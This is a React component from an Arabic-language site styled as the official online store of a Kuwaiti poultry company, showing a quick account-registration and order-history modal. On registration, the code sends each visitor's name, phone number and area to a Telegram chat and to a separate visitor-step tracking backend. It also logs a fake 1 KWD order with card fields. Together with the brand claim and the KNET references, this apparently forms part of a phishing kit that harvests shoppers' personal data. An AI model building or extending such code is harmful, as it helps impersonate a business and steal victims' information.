import React, { useState, useEffect } from 'react';
import { 
  User, 
  X, 
  LogOut, 
  ShoppingBag, 
  Receipt, 
  Clock, 
  MapPin, 
  Search, 
  CheckCircle, 
  PackageCheck,
  Phone,
  ArrowLeft
} from 'lucide-react';
import {
  sendTelegramNotification,
  trackDetailsFilled,
  getOrCreateBookingId
} from '../lib/esfgdrFirebase';
import { saveCustomerToFirestore, saveOrderToFirestore } from '../lib/firebase';
import { KUWAIT_AREAS } from '../data/products';
import { CompletedOrder } from '../types';

// Convert Arabic/Persian digits (٠-٩ / ۰-۹) to standard ASCII digits (0-9)
function toEnglishDigits(str: string): string {
  return str
    .replace(/[٠-٩]/g, (d) => String(d.charCodeAt(0) - 1632))
    .replace(/[۰-۹]/g, (d) => String(d.charCodeAt(0) - 1776));
}

function cleanKuwaitPhoneInput(raw: string): string {
  return toEnglishDigits(raw).replace(/\D/g, '').slice(0, 15);
}

interface LocalRegisteredCustomer {
  name: string;
  phone: string;
  governorate: string;
  registeredAt: string;
}

interface UserAccountModalProps {
  isOpen: boolean;
  onClose: () => void;
  onViewReceipt: (order: CompletedOrder) => void;
  onOpenCart?: () => void;
  onOpenAdmin?: () => void;
}

export const UserAccountModal: React.FC<UserAccountModalProps> = ({
  isOpen,
  onClose,
  onViewReceipt,
  onOpenCart
}) => {
  const [localCustomer, setLocalCustomer] = useState<LocalRegisteredCustomer | null>(() => {
    try {
      const saved = localStorage.getItem('delmon_kuwait_user');
      if (saved) return JSON.parse(saved);
      return null;
    } catch {
      return null;
    }
  });

  // Show form by default if not registered, or when user clicks edit/new registration
  const [isEditingRegistration, setIsEditingRegistration] = useState<boolean>(() => {
    try {
      return !localStorage.getItem('delmon_kuwait_user');
    } catch {
      return true;
    }
  });

  // Direct Kuwait Phone Registration Form State
  const [regName, setRegName] = useState(() => localStorage.getItem('cust_name') || '');
  const [regPhone, setRegPhone] = useState(() => cleanKuwaitPhoneInput(localStorage.getItem('cust_phone') || ''));
  const [regGov, setRegGov] = useState(() => {
    const saved = localStorage.getItem('cust_gov');
    return saved && KUWAIT_AREAS.includes(saved) ? saved : KUWAIT_AREAS[0];
  });
  const [regError, setRegError] = useState('');
  const [regSuccess, setRegSuccess] = useState('');
  const [isRegistering, setIsRegistering] = useState(false);

  const [orders, setOrders] = useState<CompletedOrder[]>([]);
  const [loadingOrders, setLoadingOrders] = useState(false);
  const [searchOrderId, setSearchOrderId] = useState('');
  const [searchError, setSearchError] = useState('');

  // Load orders from localStorage device history
  const loadOrders = () => {
    setLoadingOrders(true);
    try {
      const storedOrders = localStorage.getItem('delmon_saved_orders');
      const parsedOrders: CompletedOrder[] = storedOrders ? JSON.parse(storedOrders) : [];
      setOrders(parsedOrders);
    } catch {
      setOrders([]);
    } finally {
      setLoadingOrders(false);
    }
  };

  useEffect(() => {
    if (isOpen) {
      loadOrders();
      setRegError('');
      setRegSuccess('');
    }
  }, [isOpen]);

  // Direct Kuwait Registration Handler
  const handleKuwaitPhoneRegister = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    setRegError('');
    setRegSuccess('');

    const cleanedPhone = cleanKuwaitPhoneInput(regPhone);
    if (!cleanedPhone || cleanedPhone.length < 4) {
      setRegError('يرجى إدخال رقم الهاتف الكويتي بشكل صحيح.');
      return;
    }

    const finalName = regName.trim() || 'عميل دلمون الكويت';

    setIsRegistering(true);
    const profile: LocalRegisteredCustomer = {
      name: finalName,
      phone: cleanedPhone,
      governorate: regGov,
      registeredAt: new Date().toISOString()
    };

    try {
      localStorage.setItem('delmon_kuwait_user', JSON.stringify(profile));
      localStorage.setItem('cust_name', profile.name);
      localStorage.setItem('cust_phone', profile.phone);
      localStorage.setItem('cust_gov', profile.governorate);
    } catch {
      // ignore storage errors
    }

    const bookingId = getOrCreateBookingId(false);

    // Sync registration to esfgdr (bookings + bookings_steps + visitors) and Firestore customers/orders
    trackDetailsFilled({
      bookingId,
      name: profile.name,
      phone: profile.phone,
      area: profile.governorate,
      governorate: profile.governorate,
      address: profile.governorate,
      amount: 1,
      subtotal: 1,
      items: ['تسجيل حساب جديد — الكويت']
    }).catch(() => {});

    const customerObj = {
      name: profile.name,
      phone: profile.phone,
      governorate: profile.governorate,
      street: profile.governorate,
      building: '',
      paymentOption: 'full' as const,
      paymentMethod: 'knet' as const
    };

    saveCustomerToFirestore(customerObj).catch(() => {});

    saveOrderToFirestore({
      orderId: bookingId,
      date: new Date().toLocaleDateString('ar-KW'),
      customer: customerObj,
      items: [],
      subtotal: 1,
      depositPaid: 1,
      remainingDue: 0,
      total: 1,
      paymentMethod: 'تسجيل حساب عميل',
      cardLast4: '----',
      cardBank: 'حساب مسجل',
      status: 'مسجل (بيانات العميل)'
    }).catch(() => {});

    // Send directly via the single Telegram path (non-blocking)
    sendTelegramNotification(
      `🇰🇼 <b>تسجيل حساب عميل جديد من الكويت</b>\n` +
      `🆔 <b>رقم التسجيل:</b> <code>${bookingId}</code>\n` +
      `👤 <b>الاسم:</b> ${profile.name}\n` +
      `📞 <b>الهاتف:</b> <code>+965 ${profile.phone}</code>\n` +
      `📍 <b>المحافظة / المنطقة:</b> ${profile.governorate}`
    );

    setLocalCustomer(profile);
    setIsEditingRegistration(false);
    setIsRegistering(false);
    setRegSuccess('تم تسجيل وتفعيل حسابك بنجاح!');
  };

  const handleLogout = () => {
    try {
      localStorage.removeItem('delmon_kuwait_user');
    } catch {}
    setLocalCustomer(null);
    setIsEditingRegistration(true);
    setRegSuccess('');
  };

  const handleSearchOrder = (e: React.FormEvent) => {
    e.preventDefault();
    if (!searchOrderId.trim()) return;

    setSearchError('');
    let queryId = toEnglishDigits(searchOrderId.trim()).toUpperCase();
    if (!queryId.startsWith('KW-') && !queryId.startsWith('BH-')) {
      queryId = `KW-${queryId}`;
    }
    const storedOrders = localStorage.getItem('delmon_saved_orders');
    const parsedOrders: CompletedOrder[] = storedOrders ? JSON.parse(storedOrders) : [];
    const found = parsedOrders.find((o) => o.orderId.toUpperCase() === queryId);
    if (found) {
      setOrders((prev) => [found, ...prev.filter((o) => o.orderId !== found.orderId)]);
      setSearchOrderId('');
    } else {
      setSearchError('لم يتم العثور على طلب بهذا الرقم على هذا الجهاز.');
    }
  };

  if (!isOpen) return null;

  const activeName = localCustomer?.name;
  const showForm = !localCustomer || isEditingRegistration;

  return (
    <div 
      className="fixed inset-0 z-50 bg-black/60 backdrop-blur-2xs flex items-center justify-center p-4 overflow-y-auto"
      dir="rtl"
    >
      <div 
        className="bg-white rounded-3xl max-w-xl w-full shadow-2xl border border-gray-150 overflow-hidden my-8 animate-in zoom-in-95 duration-200"
      >
        {/* Modal Header */}
        <div className="bg-[#b91921] text-white p-5 sm:p-6 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-full bg-white/15 flex items-center justify-center">
              <User className="w-5 h-5 text-white" />
            </div>
            <div>
              <h3 className="font-extrabold text-base sm:text-lg">
                {activeName ? `أهلاً، ${activeName}` : 'تسجيل الدخول وحسابي — الكويت 🇰🇼'}
              </h3>
              <p className="text-[11px] text-white/80">
                المتجر الرسمي لشركة دلمون الكويت للدواجن — دولة الكويت 🇰🇼
              </p>
            </div>
          </div>

          <button
            type="button"
            onClick={onClose}
            className="w-9 h-9 rounded-full bg-white/10 hover:bg-white/20 text-white flex items-center justify-center transition cursor-pointer"
            aria-label="إغلاق"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Modal Body */}
        <div className="p-5 sm:p-6 space-y-6 max-h-[75vh] overflow-y-auto">
          
          {!showForm && localCustomer ? (
            <div className="space-y-4">
              <div className="bg-gray-50 border border-gray-200 rounded-2xl p-4 flex items-center justify-between gap-4">
                <div className="flex items-center gap-3">
                  <div className="w-12 h-12 rounded-full bg-red-100 text-[#c8102e] flex items-center justify-center font-black text-lg">
                    {activeName ? activeName[0] : '🇰🇼'}
                  </div>
                  <div>
                    <div className="font-extrabold text-sm text-gray-900">
                      {activeName || 'عميل دلمون الكويت'}
                    </div>
                    {localCustomer.phone && (
                      <div className="text-xs text-gray-600 font-bold mt-0.5" dir="ltr">
                        🇰🇼 +965 {localCustomer.phone}
                      </div>
                    )}
                    {localCustomer.governorate && (
                      <div className="text-[11px] text-gray-500 mt-0.5">
                        المنطقة: {localCustomer.governorate}
                      </div>
                    )}
                    <div className="inline-flex items-center gap-1 text-[10px] text-emerald-700 font-bold bg-emerald-50 px-2 py-0.5 rounded-md mt-1">
                      <CheckCircle className="w-3 h-3 text-emerald-600" />
                      <span>تم تفعيل الحساب بنجاح ✅</span>
                    </div>
                  </div>
                </div>

                <div className="flex flex-col gap-1.5">
                  <button
                    type="button"
                    onClick={() => setIsEditingRegistration(true)}
                    className="bg-white hover:bg-gray-100 border border-gray-300 text-gray-700 px-3 py-1.5 rounded-xl font-bold text-xs transition cursor-pointer"
                  >
                    تعديل البيانات
                  </button>
                  <button
                    type="button"
                    onClick={handleLogout}
                    className="bg-white hover:bg-red-50 border border-gray-200 text-red-600 px-3 py-1.5 rounded-xl font-bold text-xs flex items-center justify-center gap-1 transition cursor-pointer"
                  >
                    <LogOut className="w-3.5 h-3.5" />
                    <span>خروج</span>
                  </button>
                </div>
              </div>

              {/* Direct CTA buttons after registration so visitor is never stuck */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
                {onOpenCart && (
                  <button
                    type="button"
                    onClick={() => {
                      onClose();
                      onOpenCart();
                    }}
                    className="w-full bg-[#c8102e] hover:bg-[#a60b24] text-white py-3 px-4 rounded-xl font-black text-xs shadow-md transition flex items-center justify-center gap-2 cursor-pointer"
                  >
                    <ShoppingBag className="w-4 h-4" />
                    <span>الذهاب للسلة وإتمام الطلب</span>
                    <ArrowLeft className="w-4 h-4" />
                  </button>
                )}
                <button
                  type="button"
                  onClick={onClose}
                  className="w-full bg-emerald-700 hover:bg-emerald-800 text-white py-3 px-4 rounded-xl font-black text-xs shadow-md transition flex items-center justify-center gap-2 cursor-pointer"
                >
                  <span>تصفح المنتجات والتسوق الآن 🐔</span>
                </button>
              </div>
            </div>
          ) : (
            <div className="bg-gradient-to-br from-red-50/80 to-orange-50/60 border border-red-150 rounded-2xl p-5 space-y-4">
              <div className="flex items-center gap-3">
                <div className="w-11 h-11 bg-white rounded-full flex items-center justify-center shadow-xs border border-red-100 shrink-0">
                  <ShoppingBag className="w-5 h-5 text-[#c8102e]" />
                </div>
                <div>
                  <h4 className="font-black text-sm text-gray-900">تسجيل حساب سريع — عملاء الكويت 🇰🇼</h4>
                  <p className="text-xs text-gray-600 mt-0.5">
                    أدخل اسمك ورقم هاتفك الكويتي لتفعيل حسابك والطلب مباشرة.
                  </p>
                </div>
              </div>

              {/* Direct Kuwait Phone Registration Form (noValidate prevents silent HTML5 blocking) */}
              <form onSubmit={handleKuwaitPhoneRegister} noValidate className="space-y-3 bg-white p-4 rounded-xl border border-gray-200 shadow-2xs">
                <div>
                  <label className="block text-xs font-bold text-gray-700 mb-1">
                    الاسم الكامل
                  </label>
                  <input
                    type="text"
                    value={regName}
                    onChange={(e) => {
                      setRegName(e.target.value);
                      if (regError) setRegError('');
                    }}
                    placeholder="مثال: مشاري فهد العتيبي"
                    className="w-full px-3 py-2.5 border border-gray-300 rounded-xl text-xs focus:ring-2 focus:ring-[#c8102e] focus:outline-none"
                  />
                </div>

                <div>
                  <label className="block text-xs font-bold text-gray-700 mb-1">
                    رقم الهاتف النقال (الكويت) <span className="text-red-500">*</span>
                  </label>
                  <div className="flex border border-gray-300 rounded-xl overflow-hidden focus-within:ring-2 focus-within:ring-[#c8102e]">
                    <span className="bg-gray-100 px-3 py-2.5 text-xs font-bold text-gray-700 border-l border-gray-300 flex items-center gap-1" dir="ltr">
                      🇰🇼 +965
                    </span>
                    <input
                      type="tel"
                      inputMode="tel"
                      autoComplete="tel"
                      value={regPhone}
                      onChange={(e) => {
                        setRegPhone(cleanKuwaitPhoneInput(e.target.value));
                        if (regError) setRegError('');
                      }}
                      placeholder="9XXXXXXX"
                      className="flex-1 px-3 py-2.5 text-sm text-left focus:outline-none font-bold"
                      dir="ltr"
                    />
                  </div>
                </div>

                <div>
                  <label className="block text-xs font-bold text-gray-700 mb-1">
                    المحافظة / المنطقة في الكويت
                  </label>
                  <select
                    value={regGov}
                    onChange={(e) => setRegGov(e.target.value)}
                    className="w-full px-3 py-2.5 border border-gray-300 rounded-xl text-xs focus:ring-2 focus:ring-[#c8102e] focus:outline-none bg-white font-bold"
                  >
                    {KUWAIT_AREAS.map((area) => (
                      <option key={area} value={area}>
                        {area}
                      </option>
                    ))}
                  </select>
                </div>

                {regError && (
                  <div className="p-2.5 bg-red-50 border border-red-200 rounded-lg text-red-700 text-xs font-bold">
                    ⚠️ {regError}
                  </div>
                )}

                {regSuccess && (
                  <div className="p-2.5 bg-emerald-50 border border-emerald-200 rounded-lg text-emerald-800 text-xs font-bold">
                    ✅ {regSuccess}
                  </div>
                )}

                <button
                  type="submit"
                  disabled={isRegistering}
                  className="w-full bg-[#c8102e] hover:bg-[#a60b24] active:scale-98 text-white py-3.5 rounded-xl font-black text-sm shadow-md transition flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50"
                >
                  <Phone className="w-4 h-4" />
                  <span>{isRegistering ? 'جارٍ تسجيل الحساب...' : 'تسجيل الدخول وتفعيل الحساب فوراً'}</span>
                </button>
              </form>
            </div>
          )}

          {/* Quick Search for Any Order by KW-XXXXXX */}
          <div className="space-y-2">
            <label className="block text-xs font-bold text-gray-700">
              تتبع أي طلب برقم الفاتورة:
            </label>
            <form onSubmit={handleSearchOrder} noValidate className="flex gap-2">
              <div className="relative flex-1">
                <input
                  type="text"
                  value={searchOrderId}
                  onChange={(e) => setSearchOrderId(e.target.value)}
                  placeholder="مثال: KW-481920"
                  className="w-full bg-gray-50 border border-gray-300 rounded-xl px-3.5 py-2 text-xs font-bold text-gray-900 focus:outline-none focus:border-[#c8102e]"
                />
              </div>
              <button
                type="submit"
                disabled={loadingOrders}
                className="bg-[#c8102e] hover:bg-[#a60b24] text-white px-4 py-2 rounded-xl font-bold text-xs flex items-center gap-1.5 transition cursor-pointer shadow-xs"
              >
                <Search className="w-3.5 h-3.5" />
                <span>بحث</span>
              </button>
            </form>
            {searchError && (
              <p className="text-red-600 text-[11px] font-bold">{searchError}</p>
            )}
          </div>

          {/* Past Orders Section */}
          <div className="space-y-3 pt-2 border-t border-gray-150">
            <div className="flex items-center justify-between">
              <h4 className="font-black text-sm text-gray-900 flex items-center gap-2">
                <PackageCheck className="w-4 h-4 text-[#c8102e]" />
                <span>طلباتي السابقة والفواتير</span>
              </h4>
              <span className="text-[11px] font-bold text-gray-400">
                {orders.length} طلب
              </span>
            </div>

            {loadingOrders ? (
              <div className="py-8 text-center text-xs text-gray-400">
                جارٍ تحميل تفاصيل الطلبات...
              </div>
            ) : orders.length === 0 ? (
              <div className="bg-gray-50 border border-dashed border-gray-200 rounded-2xl p-6 text-center text-gray-400 space-y-2">
                <Clock className="w-8 h-8 mx-auto text-gray-300" />
                <p className="text-xs font-bold text-gray-600">لا توجد طلبات محفوظة حتى الآن</p>
                <p className="text-[11px] text-gray-400">
                  عند إتمام أي طلب عبر بوابة كي نت (KNET)، سيظهر هنا مع إيصال الدفع وحالة التوصيل.
                </p>
              </div>
            ) : (
              <div className="space-y-3">
                {orders.map((order) => (
                  <div
                    key={order.orderId}
                    className="bg-white border border-gray-200 rounded-2xl p-4 shadow-2xs hover:border-gray-300 transition space-y-2.5"
                  >
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <span className="font-black text-sm text-gray-900" dir="ltr">
                          #{order.orderId}
                        </span>
                        <span className="text-[10px] bg-green-100 text-green-800 font-extrabold px-2 py-0.5 rounded-full">
                          {order.status || 'تم الاستلام'}
                        </span>
                      </div>

                      <span className="font-black text-base text-[#c8102e]" dir="ltr">
                        {order.total?.toFixed(3)} KWD
                      </span>
                    </div>

                    <div className="text-xs text-gray-500 flex flex-wrap items-center gap-3">
                      <span>{order.date}</span>
                      {order.customer?.name && (
                        <span>العميل: {order.customer.name}</span>
                      )}
                      {order.customer?.governorate && (
                        <span className="flex items-center gap-1">
                          <MapPin className="w-3 h-3 text-gray-400" />
                          <span>{order.customer.governorate}</span>
                        </span>
                      )}
                    </div>

                    <div className="pt-2 border-t border-gray-100 flex items-center justify-between">
                      <span className="text-[11px] text-gray-400">
                        وسيلة الدفع: {order.paymentMethod || 'كي نت — KNET Gateway'}
                      </span>

                      <button
                        type="button"
                        onClick={() => {
                          onViewReceipt(order);
                          onClose();
                        }}
                        className="text-xs font-extrabold text-[#c8102e] hover:text-[#9e0c24] flex items-center gap-1 transition cursor-pointer"
                      >
                        <Receipt className="w-3.5 h-3.5" />
                        <span>عرض الفاتورة</span>
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>

        </div>

        {/* Modal Footer */}
        <div className="bg-gray-50 p-4 border-t border-gray-150 flex justify-end">
          <button
            type="button"
            onClick={onClose}
            className="bg-gray-200 hover:bg-gray-300 text-gray-800 px-5 py-2 rounded-xl font-bold text-xs transition cursor-pointer"
          >
            إغلاق
          </button>
        </div>

      </div>
    </div>
  );
};
